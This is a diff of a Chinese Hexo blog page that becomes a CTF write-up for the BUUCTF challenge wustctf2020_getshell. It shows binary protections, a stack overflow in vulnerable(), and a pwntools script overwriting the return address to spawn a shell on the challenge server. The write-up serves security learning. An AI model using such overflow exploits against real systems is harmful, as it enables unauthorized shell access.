@@ -17,16 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>solo</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/3/index.html">
+  <title>buuctf-wustctf2020_getshell | solo</title>
+  <meta name="description" content="wustctf2020_getshell123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;9&#x2F;wustctf2020_getshell&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found			&#x2F;&#x2F;没开    NX:       NX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-wustctf2020_getshell">
+<meta property="og:url" content="http://example.com/2022/03/18/buuctf-wustctf2020-getshell/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="wustctf2020_getshell123456[*] &amp;#x27;&#x2F;home&#x2F;king&#x2F;study&#x2F;ctf&#x2F;pwn&#x2F;buu&#x2F;9&#x2F;wustctf2020_getshell&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found			&#x2F;&#x2F;没开    NX:       NX">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-18T15:10:32.000Z">
+<meta property="article:modified_time" content="2022-03-18T15:11:10.276Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="buuctf-pwn">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/page/3/index.html">
+  <link rel="canonical" href="http://example.com/2022/03/18/buuctf-wustctf2020-getshell/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -333,226 +338,182 @@
 </aside>
 
   
-  <main class="main" role="main">
   
-  <div class="content article-list">
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-buuctf-wustctf2020-getshell" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
+    <div class="article-header">
+      
+        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/">泄漏libc总结(1)32位</a>
+    <h1 class="article-title" itemprop="name">
+      buuctf-wustctf2020_getshell
     </h1>
   
 
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
+      
+      <div class="article-meta">
+        <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/" class="article-date">
-	  <time datetime="2021-11-28T12:36:38.000Z" itemprop="datePublished">11月 28</time>
+	<a href="/2022/03/18/buuctf-wustctf2020-getshell/" class="article-date">
+	  <time datetime="2022-03-18T15:10:32.000Z" itemprop="datePublished">2022-03-18</time>
 	</a>
 </span>
-    
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/xctf-pwn/" rel="tag">xctf-pwn</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/23/buuctf-r2t4/">buuctf-r2t4</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/23/buuctf-r2t4/" class="article-date">
-	  <time datetime="2021-11-23T12:51:53.000Z" itemprop="datePublished">11月 23</time>
-	</a>
-</span>
-    
-    
+        
+        
   <span class="article-tag">
     <i class="icon icon-tags"></i>
 	<a class="article-tag-link-link" href="/tags/buuctf-pwn/" rel="tag">buuctf-pwn</a>
   </span>
 
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/23/buuctf-r2t4/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
+        
 
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/">pwn-canary的gdb调试小节</a>
-    </h1>
-  
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/18/buuctf-wustctf2020-getshell/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/9/wustctf2020_getshell&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found			<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span>		<span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure>
 
+
+
+<p>vulnerable()函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getshell函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804851B</span> shell           proc near</span><br><span class="line">.text:<span class="number">0804851B</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804851B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804851</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804851</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048521</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048524</span>                 push    offset command  ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">08048529</span>                 call    _system</span><br><span class="line">.text:<span class="number">0804852</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048531</span>                 nop</span><br><span class="line">.text:<span class="number">08048532</span>                 leave</span><br><span class="line">.text:<span class="number">08048533</span>                 retn</span><br><span class="line">.text:<span class="number">08048533</span> ; &#125; <span class="comment">// starts at 804851B</span></span><br><span class="line">.text:<span class="number">08048533</span> shell           endp</span><br><span class="line">.text:<span class="number">08048533</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以就是溢出覆盖到ebp+eip指向(0x0804851B)这个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_getshell&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29302</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">28</span>+p32(<span class="number">0x0804851B</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2022/03/18/buuctf-wustctf2020-getshell/" title="buuctf-wustctf2020_getshell" target="_blank" rel="external">http://example.com/2022/03/18/buuctf-wustctf2020-getshell/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">独奏</span><small class="ml-1x">学习成了习惯</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
   </div>
+</div>
+
+
+    </div>
+  </article>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/" class="article-date">
-	  <time datetime="2021-11-13T12:24:08.000Z" itemprop="datePublished">11月 13</time>
-	</a>
-</span>
     
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
     
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/pwn-canary/" rel="tag">pwn-canary</a>
-  </span>
+  </section>
 
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-pwntools" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/">v4.6.0-gdb.attach问题</a>
-    </h1>
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
-
-  </div>
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/03/18/buuctf-PicoCTF-2018-rop-chain/" title="buuctf-PicoCTF_2018_rop_chain"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/" class="article-date">
-	  <time datetime="2021-11-10T08:40:03.000Z" itemprop="datePublished">11月 10</time>
-	</a>
-</span>
-    
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/pwntools/" rel="tag">pwntools</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/10/xctf-welpwn/">xctf-welpwn</a>
-    </h1>
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
   
-
-  </div>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/10/xctf-welpwn/" class="article-date">
-	  <time datetime="2021-11-10T07:58:43.000Z" itemprop="datePublished">11月 10</time>
-	</a>
-</span>
+  <div class="bar-right">
     
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/xctf-pwn/" rel="tag">xctf-pwn</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/10/xctf-welpwn/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/08/hello-world/">Hello World</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/11/08/hello-world/" class="article-date">
-	  <time datetime="2021-11-08T04:46:57.765Z" itemprop="datePublished">11月 8</time>
-	</a>
-</span>
-    
-    
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/08/hello-world/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
     
   </div>
-
+  </div>
+</nav>
   
-    
-    <nav class="bar bar-footer clearfix" data-stick-bottom>
-        <div class="bar-inner">
-        <ul class="pager pull-left">
-            
-            <li class="prev">
-                <a href="/page/2/">
-                    <i class="icon icon-angle-left"></i>
-                    上一页
-                </a>
-            </li>
-            
-            
-            <li class="next disabled">
-                <a href="javascript:;">
-                    下一页
-                    <i class="icon icon-angle-right"></i>                    
-                </a>
-            </li>
-            
-        </ul>
-        <div class="total-article bar-right">Page 3 of 3</div>
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
         </div>
-    </nav>
-    
- 
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -617,6 +578,33 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
    
 
 
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
 
 
 
